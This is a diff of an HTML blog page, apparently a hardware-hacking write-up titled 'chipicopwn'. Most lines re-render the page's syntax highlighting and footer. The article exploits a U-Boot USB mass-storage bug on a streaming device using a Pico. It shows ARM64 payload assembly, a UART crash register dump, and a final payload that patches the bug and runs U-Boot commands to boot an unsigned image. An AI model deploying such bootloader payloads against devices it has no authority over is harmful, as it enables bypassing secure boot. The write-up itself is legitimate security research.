-    <span class="nf">b</span> <span class="no">_payload</span>
+<span class="w">    </span><span class="nf">b</span><span class="w"> </span><span class="no">_payload</span>
+<span class="w">    </span><span class="nf">b</span><span class="w"> </span><span class="no">_payload</span>
 <span class="err">[</span><span class="na">...</span><span class="p">]</span>
-<span class="na">.dword</span> <span class="mi">0x7BED9DC8</span> <span class="c1">// payload pointer at offset 0x238</span>
+<span class="na">.dword</span><span class="w"> </span><span class="mi">0x7BED9DC8</span><span class="w"> </span><span class="c1">// payload pointer at offset 0x238</span>
 <span class="err">[</span><span class="na">...</span><span class="p">]</span>
-    <span class="nf">b</span> <span class="no">_payload</span>
-    <span class="nf">b</span> <span class="no">_payload</span>
+<span class="w">    </span><span class="nf">b</span><span class="w"> </span><span class="no">_payload</span>
+<span class="w">    </span><span class="nf">b</span><span class="w"> </span><span class="no">_payload</span>
 <span class="nl">_payload:</span>
-    <span class="nf">adr</span> <span class="no">x19</span><span class="p">,</span> <span class="no">_start</span>
-    <span class="nf">mov</span> <span class="no">x20</span><span class="p">,</span> <span class="no">x30</span>
-    <span class="nf">mov</span> <span class="no">x21</span><span class="p">,</span> <span class="no">sp</span>
-    <span class="nf">mov</span> <span class="no">x22</span><span class="p">,</span> <span class="c1">#0xcafe</span>
-    <span class="nf">blr</span> <span class="no">x13</span>
-</pre></div>
-
+<span class="w">    </span><span class="nf">adr</span><span class="w"> </span><span class="no">x19</span><span class="p">,</span><span class="w"> </span><span class="no">_start</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">x20</span><span class="p">,</span><span class="w"> </span><span class="no">x30</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">x21</span><span class="p">,</span><span class="w"> </span><span class="no">sp</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">x22</span><span class="p">,</span><span class="w"> </span><span class="mi">#0</span><span class="no">xcafe</span>
+<span class="w">    </span><span class="nf">blr</span><span class="w"> </span><span class="no">x13</span>
+</code></pre></div>
 
 <p>The first instruction <em>adr</em> sets register <em>x19</em> to the payload's start address.
 The last instruction <em>blr</em> branches to an invalid pointer <em>x13</em> to ensure a crash, and thus dump registers on UART.</p>
 <p>We <a href="https://github.com/frederic/chipicopwn/commit/e118c46355d35d8ef40450fcbee2ca2ccb49ffb2">modify the Pico code</a> to use this new payload. The device crashes again :</p>
-<div class="highlight"><pre><span></span><span class="s">&quot;Synchronous Abort&quot;</span> <span class="n">handler</span><span class="p">,</span> <span class="n">esr</span> <span class="mh">0x8a000000</span>
-<span class="nl">elr</span><span class="p">:</span> <span class="n">ffffffff8110e001</span> <span class="nl">lr</span> <span class="p">:</span> <span class="n">fffffffffcfeb700</span> <span class="p">(</span><span class="n">reloc</span><span class="p">)</span>
-<span class="nl">elr</span><span class="p">:</span> <span class="mo">0000000000000001</span> <span class="nl">lr</span> <span class="p">:</span> <span class="mo">000000007</span><span class="n">bedd700</span>
-<span class="nl">x0</span> <span class="p">:</span> <span class="mf">00000000ff</span><span class="n">ffffff</span> <span class="nl">x1</span> <span class="p">:</span> <span class="mo">0000000000000001</span>
-<span class="nl">x2</span> <span class="p">:</span> <span class="mo">000000007</span><span class="n">bed5888</span> <span class="nl">x3</span> <span class="p">:</span> <span class="mo">0000000000000000</span>
-<span class="nl">x4</span> <span class="p">:</span> <span class="mo">000000000000</span><span class="mi">8000</span> <span class="nl">x5</span> <span class="p">:</span> <span class="mo">0000000000000200</span>
-<span class="nl">x6</span> <span class="p">:</span> <span class="n">d63f01a0d2995fd6</span> <span class="nl">x7</span> <span class="p">:</span> <span class="mo">0000000000000000</span>
-<span class="nl">x8</span> <span class="p">:</span> <span class="mo">0000000000000001</span> <span class="nl">x9</span> <span class="p">:</span> <span class="mo">000000000000000</span><span class="mi">8</span>
-<span class="nl">x10</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c0021b0</span> <span class="nl">x11</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c009b80</span>
-<span class="nl">x12</span><span class="p">:</span> <span class="mo">0000000000000001</span> <span class="nl">x13</span><span class="p">:</span> <span class="mo">0000000000000001</span>
-<span class="nl">x14</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">bed5c4c</span> <span class="nl">x15</span><span class="p">:</span> <span class="mf">00000000ff</span><span class="n">ffffff</span>
-<span class="nl">x16</span><span class="p">:</span> <span class="mo">0000000000004060</span> <span class="nl">x17</span><span class="p">:</span> <span class="mo">00000000000000</span><span class="mi">84</span>
-<span class="nl">x18</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">bee1dc8</span> <span class="nl">x19</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">bed5700</span>
-<span class="nl">x20</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">bed9dc8</span> <span class="nl">x21</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">bed5960</span>
-<span class="nl">x22</span><span class="p">:</span> <span class="mo">000000000000</span><span class="n">cafe</span> <span class="nl">x23</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c008490</span>
-<span class="nl">x24</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c008490</span> <span class="nl">x25</span><span class="p">:</span> <span class="mf">000000007ff</span><span class="n">dcd80</span>
-<span class="nl">x26</span><span class="p">:</span> <span class="mo">0000000000000000</span> <span class="nl">x27</span><span class="p">:</span> <span class="mo">0000000000000000</span>
-<span class="nl">x28</span><span class="p">:</span> <span class="mo">000000007</span><span class="n">c009ac0</span> <span class="nl">x29</span><span class="p">:</span> <span class="mf">14001f6e14001</span><span class="n">f6f</span>
+<div class="highlight"><pre><span></span><code><span class="s">&quot;Synchronous Abort&quot;</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">esr</span><span class="w"> </span><span class="mh">0x8a000000</span>
+<span class="nl">elr</span><span class="p">:</span><span class="w"> </span><span class="n">ffffffff8110e001</span><span class="w"> </span><span class="n">lr</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">fffffffffcfeb700</span><span class="w"> </span><span class="p">(</span><span class="n">reloc</span><span class="p">)</span>
+<span class="nl">elr</span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000001</span><span class="w"> </span><span class="n">lr</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">bedd700</span>
+<span class="nl">x0</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mf">00000000f</span><span class="n">fffffff</span><span class="w"> </span><span class="n">x1</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000001</span>
+<span class="nl">x2</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">bed5888</span><span class="w"> </span><span class="n">x3</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
+<span class="nl">x4</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mo">000000000000</span><span class="mi">8000</span><span class="w"> </span><span class="n">x5</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000200</span>
+<span class="nl">x6</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">d63f01a0d2995fd6</span><span class="w"> </span><span class="n">x7</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
+<span class="nl">x8</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000001</span><span class="w"> </span><span class="n">x9</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mo">000000000000000</span><span class="mi">8</span>
+<span class="nl">x10</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c0021b0</span><span class="w"> </span><span class="n">x11</span><span class="o">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c009b80</span>
+<span class="nl">x12</span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000001</span><span class="w"> </span><span class="n">x13</span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000001</span>
+<span class="nl">x14</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">bed5c4c</span><span class="w"> </span><span class="n">x15</span><span class="o">:</span><span class="w"> </span><span class="mf">00000000f</span><span class="n">fffffff</span>
+<span class="nl">x16</span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000004060</span><span class="w"> </span><span class="n">x17</span><span class="o">:</span><span class="w"> </span><span class="mo">00000000000000</span><span class="mi">84</span>
+<span class="nl">x18</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">bee1dc8</span><span class="w"> </span><span class="n">x19</span><span class="o">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">bed5700</span>
+<span class="nl">x20</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">bed9dc8</span><span class="w"> </span><span class="n">x21</span><span class="o">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">bed5960</span>
+<span class="nl">x22</span><span class="p">:</span><span class="w"> </span><span class="mo">000000000000</span><span class="n">cafe</span><span class="w"> </span><span class="n">x23</span><span class="o">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c008490</span>
+<span class="nl">x24</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c008490</span><span class="w"> </span><span class="n">x25</span><span class="o">:</span><span class="w"> </span><span class="mf">000000007f</span><span class="n">fdcd80</span>
+<span class="nl">x26</span><span class="p">:</span><span class="w"> </span><span class="mo">0000000000000000</span><span class="w"> </span><span class="n">x27</span><span class="o">:</span><span class="w"> </span><span class="mo">0000000000000000</span>
+<span class="nl">x28</span><span class="p">:</span><span class="w"> </span><span class="mo">000000007</span><span class="n">c009ac0</span><span class="w"> </span><span class="n">x29</span><span class="o">:</span><span class="w"> </span><span class="mf">14001f6e14001f6f</span>
 
-<span class="n">Resetting</span> <span class="n">CPU</span> <span class="p">...</span>
-</pre></div>
-
+<span class="n">Resetting</span><span class="w"> </span><span class="n">CPU</span><span class="w"> </span><span class="p">...</span>
+</code></pre></div>
 
 <p>Register <em>x22</em> contains the flag that indicates the payload was executed successfully. And <em>x19</em> reveals that payload's start address is <strong>0x7bed5700</strong>.</p>
 <p>To summarize, the exploit requires an USB Mass Storage device with :</p>
@@ -525,27 +573,26 @@ The last instruction <em>blr</em> branches to an invalid pointer <em>x13</em> to
 <p>Variable <em>gd-&gt;relocaddr</em> indicates that the bootloader is at <strong>0x7fef2000</strong>. We dump memory from this address up to <em>gd-&gt;ram_top</em>.</p>
 <h2>3.5 Final payload</h2>
 <p>With the bootloader image in hands, we can design a payload that relies on bootloader functions. We use <a href="https://ghidra-sre.org/">Ghidra</a> to get the address of function <a href="https://github.com/u-boot/u-boot/blob/3918376e91dac7711cf04bd06f8de80e797edfea/common/cli.c#L84">run_command_list</a>, which gives us access to U-Boot built-in commands.</p>
-<div class="highlight"><pre><span></span><span class="na">.text</span>
-<span class="na">.global</span> <span class="no">_start</span>
+<div class="highlight"><pre><span></span><code><span class="na">.text</span>
+<span class="na">.global</span><span class="w"> </span><span class="no">_start</span>
 <span class="nl">_start:</span>
-    <span class="nf">sub</span> <span class="no">sp</span><span class="p">,</span> <span class="no">sp</span><span class="p">,</span> <span class="c1">#0x1000 // move SP below us to avoid being overwritten when calling functions</span>
-    <span class="nf">ldr</span> <span class="no">x0</span><span class="p">,</span> <span class="no">_bug_ptr</span>
-    <span class="nf">ldr</span> <span class="no">x1</span><span class="p">,</span> <span class="no">_bug_fix</span>
-    <span class="nf">str</span> <span class="no">x1</span><span class="p">,</span> <span class="p">[</span><span class="no">x0</span><span class="p">]</span>  <span class="c1">// fix the bug we just exploited</span>
-    <span class="nf">adr</span> <span class="no">x0</span><span class="p">,</span> <span class="no">_command_list</span>
-    <span class="nf">mov</span> <span class="no">w1</span><span class="p">,</span> <span class="c1">#0xffffffff</span>
-    <span class="nf">mov</span> <span class="no">w2</span><span class="p">,</span> <span class="c1">#0x0</span>
-    <span class="nf">ldr</span> <span class="no">x30</span><span class="p">,</span> <span class="no">_download_buf</span> <span class="c1">// set LR to download buffer</span>
-    <span class="nf">ldr</span> <span class="no">x3</span><span class="p">,</span> <span class="no">_run_command_list</span> <span class="c1">// load binary into download buffer</span>
-    <span class="nf">br</span> <span class="no">x3</span>
+<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">sp</span><span class="p">,</span><span class="w"> </span><span class="no">sp</span><span class="p">,</span><span class="w"> </span><span class="mi">#0</span><span class="no">x1000</span><span class="w"> </span><span class="c1">// move SP below us to avoid being overwritten when calling functions</span>
+<span class="w">    </span><span class="nf">ldr</span><span class="w"> </span><span class="no">x0</span><span class="p">,</span><span class="w"> </span><span class="no">_bug_ptr</span>
+<span class="w">    </span><span class="nf">ldr</span><span class="w"> </span><span class="no">x1</span><span class="p">,</span><span class="w"> </span><span class="no">_bug_fix</span>
+<span class="w">    </span><span class="nf">str</span><span class="w"> </span><span class="no">x1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">x0</span><span class="p">]</span><span class="w">  </span><span class="c1">// fix the bug we just exploited</span>
+<span class="w">    </span><span class="nf">adr</span><span class="w"> </span><span class="no">x0</span><span class="p">,</span><span class="w"> </span><span class="no">_command_list</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">w1</span><span class="p">,</span><span class="w"> </span><span class="mi">#0</span><span class="no">xffffffff</span>
+<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">w2</span><span class="p">,</span><span class="w"> </span><span class="mi">#0</span><span class="no">x0</span>
+<span class="w">    </span><span class="nf">ldr</span><span class="w"> </span><span class="no">x30</span><span class="p">,</span><span class="w"> </span><span class="no">_download_buf</span><span class="w"> </span><span class="c1">// set LR to download buffer</span>
+<span class="w">    </span><span class="nf">ldr</span><span class="w"> </span><span class="no">x3</span><span class="p">,</span><span class="w"> </span><span class="no">_run_command_list</span><span class="w"> </span><span class="c1">// load binary into download buffer</span>
+<span class="w">    </span><span class="nf">br</span><span class="w"> </span><span class="no">x3</span>
 
-<span class="nl">_bug_ptr:</span> <span class="na">.dword</span> <span class="mi">0x7ff26060</span>
-<span class="nl">_bug_fix:</span> <span class="na">.dword</span> <span class="mi">0xd65f03c0d2800000</span>
-<span class="nl">_download_buf:</span> <span class="na">.dword</span> <span class="mi">0x01000000</span>
-<span class="nl">_run_command_list:</span> <span class="na">.dword</span> <span class="mi">0x7ff24720</span>
-<span class="nl">_command_list:</span> <span class="na">.asciz</span> <span class="s">&quot;echo CHIPICOPWN!;osd setcolor 0x1b0d2b0d;usb reset;fatload usb 0 0x8000000 CHIPICOPWN.BMP;bmp display 0x8000000;while true;do usb reset;if fatload usb 0 0x01000000 u-boot-elaine.bin;then echo yolo;exit;fi;done;&quot;</span>
-</pre></div>
-
+<span class="nl">_bug_ptr:</span><span class="w"> </span><span class="na">.dword</span><span class="w"> </span><span class="mi">0x7ff26060</span>
+<span class="nl">_bug_fix:</span><span class="w"> </span><span class="na">.dword</span><span class="w"> </span><span class="mi">0xd65f03c0d2800000</span>
+<span class="nl">_download_buf:</span><span class="w"> </span><span class="na">.dword</span><span class="w"> </span><span class="mi">0x01000000</span>
+<span class="nl">_run_command_list:</span><span class="w"> </span><span class="na">.dword</span><span class="w"> </span><span class="mi">0x7ff24720</span>
+<span class="nl">_command_list:</span><span class="w"> </span><span class="na">.asciz</span><span class="w"> </span><span class="s">&quot;echo CHIPICOPWN!;osd setcolor 0x1b0d2b0d;usb reset;fatload usb 0 0x8000000 CHIPICOPWN.BMP;bmp display 0x8000000;while true;do usb reset;if fatload usb 0 0x01000000 u-boot-elaine.bin;then echo yolo;exit;fi;done;&quot;</span>
+</code></pre></div>
 
 <p>This final payload :</p>
 <ul>
@@ -608,16 +655,25 @@ The initial ramdisk (initrd) from Ubuntu is <a href="https://github.com/frederic
 
 
 
-    <div class="addthis_relatedposts_inline">
+
 
 
 </article>
 
-    <footer>
+<footer>
 <p>
-  &copy;   - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
+  &copy;   - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/deed.en_US" target="_blank">Creative Commons Attribution-ShareAlike 4.0 International License</a>
 </p>
-<p>    Powered by <a href="http://getpelican.com" target="_blank">Pelican</a> - Theme <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="https://fredericb.info/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="light"
+          type="text/javascript">
+  </script>
 </p><p>
   <a rel="license"
      href="http://creativecommons.org/licenses/by-sa/4.0/"
@@ -625,15 +681,11 @@ The initial ramdisk (initrd) from Ubuntu is <a href="https://github.com/frederic
     <img alt="Creative Commons License"
          title="Creative Commons License"
          style="border-width:0"
-         src="https://i.creativecommons.org/l/by-sa/4.0/80x15.png"
+           src="https://fredericb.info/theme/img/cc/by-sa.png"
          width="80"
          height="15"/>
   </a>
-</p>    </footer>
-  </main>
-
-
-
+</p></footer>  </main>
 
 <script type="application/ld+json">
 {
@@ -641,10 +693,27 @@ The initial ramdisk (initrd) from Ubuntu is <a href="https://github.com/frederic
   "@type" : "Blog",
   "name": " fred's notes ",
   "url" : "https://fredericb.info",
-  "image": "/resources/sitelogo.jpg",
+  "image": "/sitelogo.jpg",
   "description": "Frédéric's Thoughts and Writings"
 }
-</script>
+</script><a href="https://github.com/frederic" target="_blank" class="github-corner" aria-label="View source on Github">
+    <svg width="80"
+         height="80"
+         viewBox="0 0 250 250"
+         style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;"
+         aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor"
+              style="transform-origin: 130px 106px;"
+              class="octo-arm">
+        </path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor"
+              class="octo-body">
+        </path>
+    </svg>
+</a>
 
 </body>
 </html>
